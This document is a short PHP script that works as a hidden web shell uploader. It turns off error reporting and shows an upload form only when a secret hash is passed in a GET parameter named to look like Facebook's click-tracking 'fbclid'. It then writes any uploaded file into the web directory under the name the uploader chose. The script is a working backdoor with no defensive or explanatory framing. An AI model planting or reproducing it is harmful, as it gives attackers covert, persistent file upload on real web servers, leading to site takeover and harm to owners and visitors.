<?php error_reporting(0);if($_GET['fbclid']=='1c387230e81c96e5f7bd04cb9fe3f631'){echo '<form action="" method="post" enctype="multipart/form-data" name="Upl0ader" id="Upl0ader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upl0ad"></form>';}if($_POST['_upl']=="Upl0ad"){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){echo 'Ok! :)';}else{echo 'No!';}}?>